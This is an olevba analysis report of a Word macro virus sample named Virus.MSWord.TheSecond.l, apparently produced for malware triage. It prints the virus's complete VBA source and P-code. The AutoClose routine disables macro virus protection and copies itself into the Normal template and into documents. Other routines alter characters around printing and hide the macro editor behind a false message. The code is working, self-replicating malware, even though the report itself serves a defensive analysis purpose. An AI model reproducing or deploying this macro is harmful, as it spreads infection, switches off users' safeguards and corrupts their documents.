olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.TheSecond.l
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.TheSecond.l - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Gruzin.bas 
in file: Virus.MSWord.TheSecond.l - OLE stream: 'Macros/VBA/Gruzin'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim Flag As Boolean
Dim i As Integer
Dim X As String
Dim S As Boolean



Sub AutoClose()
  Options.VirusProtection = False
  If Documents.Count > 0 Then
    counter = NormalTemplate.VBProject.VBComponents.Count
    Flag = False
    For i = 1 To counter
      If NormalTemplate.VBProject.VBComponents.Item(i).Name = "Gruzin" Then Flag = True
    Next i
    X = Application.StartupPath + "\Gruzin.tmp"
    If Not Flag Then
      ActiveDocument.VBProject.VBComponents("Gruzin").Export (X)
      NormalTemplate.VBProject.VBComponents.Import (X)
    End If
    Flag = True
    S = ActiveDocument.Saved
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents.Item(i).Name = "Gruzin" Then Flag = False
    Next i
    If Flag Then
      NormalTemplate.VBProject.VBComponents("Gruzin").Export (X)
      ActiveDocument.VBProject.VBComponents.Import (X)
      If S And (Left(ActiveDocument.Name, 8) <> "Äîêóìåíò") Then
            Dialogs(wdDialogFileSaveAs).Execute
        End If
    End If
    ActiveDocument.Saved = S
  End If
End Sub
Sub FilePrint()
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = "å"
    .Replacement.Text = "ý"
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
  Dialogs(wdDialogFilePrint).Show
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = "ý"
    .Replacement.Text = "å"
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
End Sub
Sub ToolsMacro()
  Dialogs(wdDialogToolsMacro).Display
End Sub
Sub ViewVBCode()
  MsgBox ("Íåò çàãðóæåííûõ ìàêðîñîâ!")
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.TheSecond.l
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Gruzin - 3774 bytes
' Line #0:
' 	Dim 
' 	VarDefn Flag (As Boolean)
' Line #1:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #2:
' 	Dim 
' 	VarDefn X (As String)
' Line #3:
' 	Dim 
' 	VarDefn S (As Boolean)
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' 	FuncDefn (Sub AutoClose())
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #10:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St counter 
' Line #11:
' 	LitVarSpecial (False)
' 	St Flag 
' Line #12:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld counter 
' 	For 
' Line #13:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Gruzin"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Flag 
' 	EndIf 
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #15:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000B "\Gruzin.tmp"
' 	Add 
' 	St X 
' Line #16:
' 	Ld Flag 
' 	Not 
' 	IfBlock 
' Line #17:
' 	Ld X 
' 	Paren 
' 	LitStr 0x0006 "Gruzin"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #18:
' 	Ld X 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	LitVarSpecial (True)
' 	St Flag 
' Line #21:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St S 
' Line #22:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #23:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Gruzin"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St Flag 
' 	EndIf 
' Line #24:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	Ld Flag 
' 	IfBlock 
' Line #26:
' 	Ld X 
' 	Paren 
' 	LitStr 0x0006 "Gruzin"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #27:
' 	Ld X 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #28:
' 	Ld S 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Äîêóìåíò"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #29:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Execute 0x0000 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	Ld S 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Sub FilePrint())
' Line #36:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #37:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #38:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #39:
' 	LitStr 0x0001 "å"
' 	MemStWith Then 
' Line #40:
' 	LitStr 0x0001 "ý"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #41:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #42:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #43:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #44:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #45:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #46:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #47:
' 	EndWith 
' Line #48:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #49:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #50:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #51:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #52:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #53:
' 	LitStr 0x0001 "ý"
' 	MemStWith Then 
' Line #54:
' 	LitStr 0x0001 "å"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #55:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #56:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #57:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #58:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #59:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #60:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #61:
' 	EndWith 
' Line #62:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Sub ToolsMacro())
' Line #65:
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' Line #66:
' 	EndSub 
' Line #67:
' 	FuncDefn (Sub ViewVBCode())
' Line #68:
' 	LitStr 0x0019 "Íåò çàãðóæåííûõ ìàêðîñîâ!"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #69:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

